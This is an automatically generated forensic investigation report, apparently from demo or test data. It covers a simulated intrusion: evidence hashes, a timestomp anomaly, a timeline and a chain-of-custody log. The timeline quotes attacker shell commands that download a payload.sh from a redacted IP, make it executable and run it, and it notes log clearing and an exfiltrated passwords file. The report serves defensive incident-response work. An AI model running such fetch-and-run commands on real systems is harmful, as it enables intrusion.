# WASP Investigation Report — CASE-2026-LIVE

**Lead Examiner:** Alex Mercer (Senior Forensics Examiner)  
**Organization:** Cyber Incident Response Unit  
**Authorization Reference:** WARRANT-2026-0881  
**Schema Version:** 2.0.0 | **Tool Version:** 1.4.0  

---

## 1. Executive Summary & PS Objectives Matrix

| # | Objective | Status | Findings |
|---|---|---|---|
| 1 | **File metadata extraction** | COMPLETED | Extracted filesystem stats, OOXML properties, PDF metadata, ZIP entries. |
| 2 | **System artefact extraction** | COMPLETED | Extracted MFT, registry hives, EVTX event logs, Prefetch, LNK shortcuts, browser history. |
| 3 | **Timestamp extraction** | COMPLETED | Decoded multi-epoch timestamps normalized to UTC with explainable confidence. |
| 4 | **Chronological timeline reconstruction** | COMPLETED | Generated single normalized super-timeline with 28 records. |
| 5 | **SHA-256 evidence integrity** | VERIFIED | Mandatory SHA-256 computed; custody ledger replayed; Merkle root: `b74fae87c842ecde83e830730ebf69f6c67f41461cc356bb67274e29b6911ac3`. |
| 6 | **Structured investigation reports** | COMPLETED | Compiled multi-format reports with provenance, integrity block, and privacy redaction. |

---

## 2. Digital Evidence Inventory (SHA-256 Hashes)

| Evidence ID | Path | Container | Size (Bytes) | SHA-256 Hash | Status |
|---|---|---|---|---|---|

| `EV-AUTH.L` | `evidence/auth.log` | raw | 283 | `b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4` | MATCH |

| `EV-BASH_H` | `evidence/bash_history` | raw | 112 | `a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554` | MATCH |

| `EV-EXFILT` | `evidence/exfiltrated_files.zip` | raw | 317 | `55f22e4ff7eab75d6ead9f275cf4d00c9f60cf3c1352d2cb9795a50a7dcbe733` | MATCH |

| `EV-HISTOR` | `evidence/History` | raw | 8192 | `ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95` | MATCH |

| `EV-INVEST` | `evidence/investigation_memo.docx` | raw | 813 | `9e1f5b395f76106120d0c513df1576e93e9f3dac9f337ca22b6c07be2d425f68` | MATCH |

| `EV-SECURI` | `evidence/Security_Events.jsonl` | raw | 503 | `15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0` | MATCH |


---




## 4. Cross-Source Corroboration & Anti-Forensics Analysis

- **Corroborated Activity Clusters:** 0
- **Corroborated Events Count:** 0
- **Anti-Forensics / Conflicts Detected:** 1


### Anti-Forensic Anomalies & Timestomp Conflicts
| Severity | Entity | Anomaly Type | Description |
|---|---|---|---|

| **MEDIUM** | `investigation_memo.docx` | `MODIFIED_PRE_CREATION` | Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:19:28.794882+00:00 |





---


## 5. Reconstructed Chronological Activity Timeline (Excerpt)

| UTC Timestamp | Action | User | Object / Target | Source Artefact | Corroborated By | Conf. | Rationale |
|---|---|---|---|---|---|---|---|

| `2024-03-10T14:30:00+00:00` | `FILE_CREATE` | [USER_001] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:created metadata |

| `2024-03-10T20:50:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://github.com/malicious/repo` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-10T21:00:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://pastebin.com/raw/d849fa` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-11T01:50:00+00:00` | `FILE_WRITE` | [USER_002] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:modified metadata (⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:19:28.794882+00:00) |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4624 |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:15:00+00:00` | `PROCESS_START` | UNKNOWN | `wget http://[IP_004]/payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:15:30+00:00` | `FILE_ACCESS` | UNKNOWN | `sudo` | Linux:sudo:evidence/auth.log | `-` | 0.85 | Syslog entry for sudo (assumed year 2024) |

| `2024-03-11T02:16:00+00:00` | `PROCESS_START` | UNKNOWN | `chmod +x payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:16:15+00:00` | `PROCESS_START` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4688 |

| `2024-03-11T02:17:00+00:00` | `PROCESS_START` | UNKNOWN | `./payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:17:30+00:00` | `SERVICE_INSTALL` | UNKNOWN | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 7045 |

| `2024-03-11T02:18:45+00:00` | `FILE_ACCESS` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:20:00+00:00` | `LOG_CLEARED` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 1102 |

| `2026-10-05T19:19:25.001462+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:19:25.006962+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:19:25.012812+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:19:25.038807+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:19:25.057383+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:19:25.068376+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:19:25.202047+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:19:26.173855+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:19:27.029291+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:19:27.931624+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:19:28.794882+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:19:29.774410+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-06T00:49:24+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::passwords.txt` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |

| `2026-10-06T00:49:24+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::financial_report.pdf` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |


*(Total reconstructed timeline events: 28)*

---

## 6. Cryptographic Integrity & Attestation

- **Overall Integrity Check:** `PASS`
- **Custody Ledger Replay:** `PASS` (12 entries verified)
- **Derived Files Status:** `PASS`
- **Merkle Root Digest:** `b74fae87c842ecde83e830730ebf69f6c67f41461cc356bb67274e29b6911ac3`

---

## 7. Chain of Custody Audit Log

| Seq | Timestamp (UTC) | Actor | Event Type | Prev Hash | Entry Hash |
|---|---|---|---|---|---|

| 1 | `2026-10-05T19:19:25.084468+00:00` | Alex Mercer (Senior Forensics Examiner) | `case_created` | `000000000000...` | `9a4387af5fda...` |

| 2 | `2026-10-05T19:19:26.161854+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `9a4387af5fda...` | `30ed0a0c2cbb...` |

| 3 | `2026-10-05T19:19:27.011741+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `30ed0a0c2cbb...` | `252858ead81d...` |

| 4 | `2026-10-05T19:19:27.913233+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `252858ead81d...` | `beb1124d0c27...` |

| 5 | `2026-10-05T19:19:28.778102+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `beb1124d0c27...` | `f801e92f4019...` |

| 6 | `2026-10-05T19:19:29.753366+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `f801e92f4019...` | `69c793aa4d7a...` |

| 7 | `2026-10-05T19:19:30.667630+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `69c793aa4d7a...` | `e24c2bdf54d3...` |

| 8 | `2026-10-05T19:19:30.809973+00:00` | Alex Mercer (Senior Forensics Examiner) | `artefacts_extracted` | `e24c2bdf54d3...` | `dbc69ba0c6ed...` |

| 9 | `2026-10-05T19:19:31.001396+00:00` | Alex Mercer (Senior Forensics Examiner) | `cross_source_corroborated` | `dbc69ba0c6ed...` | `8215757f9a57...` |

| 10 | `2026-10-05T19:19:31.026600+00:00` | Alex Mercer (Senior Forensics Examiner) | `threat_rules_scanned` | `8215757f9a57...` | `4938b227b414...` |

| 11 | `2026-10-05T19:19:31.714674+00:00` | Alex Mercer (Senior Forensics Examiner) | `timeline_built` | `4938b227b414...` | `eb666d6203e0...` |

| 12 | `2026-10-05T19:19:31.793878+00:00` | Alex Mercer (Senior Forensics Examiner) | `integrity_verified` | `eb666d6203e0...` | `3b122961915b...` |


---
*Generated automatically by WASP v1.4.0.*
